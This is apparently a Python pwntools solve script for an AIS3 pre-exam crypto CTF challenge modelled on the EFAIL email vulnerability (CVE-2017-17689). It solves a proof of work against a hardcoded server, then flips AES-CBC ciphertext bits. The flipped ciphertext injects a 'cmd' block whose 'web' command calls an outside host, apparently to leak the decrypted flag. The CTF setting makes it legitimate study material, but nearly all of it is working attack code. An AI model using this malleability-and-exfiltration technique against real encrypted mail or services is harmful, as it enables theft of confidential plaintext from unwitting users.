#!/usr/bin/env python
from pwn import *
from hashlib import sha256
from base64 import b64encode as b64e
from base64 import b64decode as b64d
from Crypto.Cipher import AES

# AIS3{Th0r - CVE-2017-17689 Ef4IL r4GNaroK}

host , port = '104.199.235.135' , 20003
y = remote( host , port )

y.recvuntil( '== \'' )
a = y.recv( 6 )
y.recvuntil( '== \'' )
b = y.recv( 6 )

p = range(48,58) + range(65,91) + range(97,123)
sol = ''

for i in xrange( 0x100000000 ):
    sol = a + str( i )
    if sha256( sol ).hexdigest().startswith( b ):
        break

y.sendline( sol )

# abcdefghijklmnopqrstuvwxyz
flag = 'AIS3{T'

mail_for_ctfplayer = '''From: thor@ais3.org
To: ctfplayer@ais3.org

--BOUNDARY
Type: text
Welcome to AIS3 pre-exam.

--BOUNDARY
Type: cmd
echo 'This is the blog of oalieno'
web 'https://oalieno.github.io'
echo 'This is the blog of bamboofox team'
web 'https://bamboofox.github.io/'

--BOUNDARY
Type: text
You can find some useful tutorial on there.
And you might be wondering where is the flag?
Just hold tight, and remember that patient is virtue.

--BOUNDARY
Type: text
Here is your flag : {}

--BOUNDARY
Type: text
Hope you like our crypto challenges.
Thanks for solving as always.
I'll catch you guys next time.
See ya!

--BOUNDARY
'''.format(flag)

mod = '''From: thor@ais3.org
To: ctfplayer@ais3.org

--BOUNDARY
Type: text
Welcome to AIS3 pre-exam.

--BOUNDARY
Type: cmd
echo 'This is the blog of oalieno'
web 'https://oalieno.github.io'
echo 'This is the blog of bamboofox team'
web 'https://bamboofox.github.io/'

--BOUNDARY
Type: text
You can find some useful tutorial on there.
And you might be wondering where is the flag?
Just hold tight, and remember

--BOUNDARY
 is virtue.

--BOUNType: cmd
webxt
Here is your fla'sheep.ga/'''


y.sendlineafter( '>' , '1' )

c = b64d( y.recvline() )
p = [ ord(i) for i in mail_for_ctfplayer ]
c = [ ord(i) for i in c ]
m = [ ord(i) for i in mod ]

for i in range( len( m ) ):
    if p[i] != m[i]:
        c[i-16] = c[i-16] ^ p[i] ^ m[i]

y.sendlineafter( '>' , '2' )
y.sendlineafter( ':' , b64e( ''.join( chr( i ) for i in c ) ) )

y.interactive()